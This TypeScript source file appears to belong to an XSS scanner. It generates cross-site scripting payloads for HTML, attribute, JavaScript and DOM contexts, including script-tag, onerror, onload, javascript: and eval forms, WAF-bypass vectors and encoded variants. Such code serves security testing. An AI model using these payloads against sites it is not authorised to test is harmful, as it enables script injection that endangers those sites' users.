import type * as Types from '@app/Types.ts'
import * as Vectors from '@vectors/index.ts'
import Encoder from '@app/Utils.ts'

/**
 * Core payload generation engine.
 * @description Creates and modifies XSS test payloads.
 */
export class CorePayload {
  /**
   * Generate contextual payloads.
   * @description Adapts payloads for specific injection contexts.
   * @param basePayloads - Base payload array
   * @param context - Injection context type
   * @returns Contextual payload array
   */
  static generateContextualPayloads(basePayloads: string[], context: Types.XssContext): string[] {
    const contextualPayloads: string[] = []
    for (const basePayload of basePayloads) {
      switch (context) {
        case 'html':
          contextualPayloads.push(...this.getHtmlPayloads(basePayload))
          break
        case 'javascript':
          contextualPayloads.push(...this.getJsPayloads(basePayload))
          break
        case 'attribute':
          contextualPayloads.push(...this.getAttributePayloads(basePayload))
          break
        case 'dom':
          contextualPayloads.push(...this.getDomPayloads(basePayload))
          break
        default:
          contextualPayloads.push(basePayload)
      }
    }
    return contextualPayloads
  }

  /**
   * Generate encoded payloads.
   * @description Creates encoding variations of each payload.
   * @param payloads - Original payload array
   * @returns Encoded payload variations
   */
  static generateEncodedPayloads(payloads: string[]): string[] {
    const encoded: string[] = []
    for (const payload of payloads) {
      const variations = Encoder.generateEncodings(payload)
      encoded.push(...variations)
    }
    return encoded
  }

  /**
   * Get all payloads for scan.
   * @description Generates complete payload set for scan.
   * @param config - Scan configuration object
   * @returns Complete payload array
   */
  static getAllPayloads(_config: Types.ScanConfig): string[] {
    const basePayloads = [
      ...Vectors.BasicVector.all(),
      ...Vectors.AdvancedVector.all(),
      ...Vectors.ModernVector.all(),
      ...Vectors.WAFVector.all('test')
    ]
    const contextual = this.generateContextualPayloads(basePayloads, 'html')
    const encoded = this.generateEncodedPayloads(contextual)
    const allPayloads = [...basePayloads, ...contextual, ...encoded]
    return allPayloads
  }

  /**
   * Get attribute payloads.
   * @description Creates HTML attribute injection payload variations.
   * @param basePayload - Base payload string
   * @returns Attribute payload variations
   */
  private static getAttributePayloads(basePayload: string): string[] {
    return [
      `"${basePayload}"`,
      `'${basePayload}'`,
      `${basePayload}`,
      `${basePayload}\x00`,
      `${basePayload}\x0d`,
      `${basePayload}\x0a`
    ]
  }

  /**
   * Get DOM payloads.
   * @description Creates DOM-based XSS payload variations.
   * @param basePayload - Base payload string
   * @returns DOM payload variations
   */
  private static getDomPayloads(basePayload: string): string[] {
    return [
      basePayload,
      `${basePayload}();`,
      `${basePayload}().toString()`,
      `document.write(${basePayload})`,
      `alert(${basePayload})`,
      `console.log(${basePayload})`
    ]
  }

  /**
   * Get HTML payloads.
   * @description Creates HTML injection payload variations.
   * @param basePayload - Base payload string
   * @returns HTML payload variations
   */
  private static getHtmlPayloads(basePayload: string): string[] {
    return [
      basePayload,
      `<${basePayload}>`,
      `</${basePayload}>`,
      `<script>${basePayload}</script>`,
      `<img src=x onerror=${basePayload}>`,
      `<svg onload=${basePayload}>`
    ]
  }

  /**
   * Get JavaScript payloads.
   * @description Creates JavaScript injection payload variations.
   * @param basePayload - Base payload string
   * @returns JavaScript payload variations
   */
  private static getJsPayloads(basePayload: string): string[] {
    return [
      basePayload,
      `javascript:${basePayload}`,
      `<script>${basePayload}</script>`,
      `eval(${basePayload})`,
      `Function(${basePayload})()`,
      `setTimeout(${basePayload},0)`
    ]
  }
}
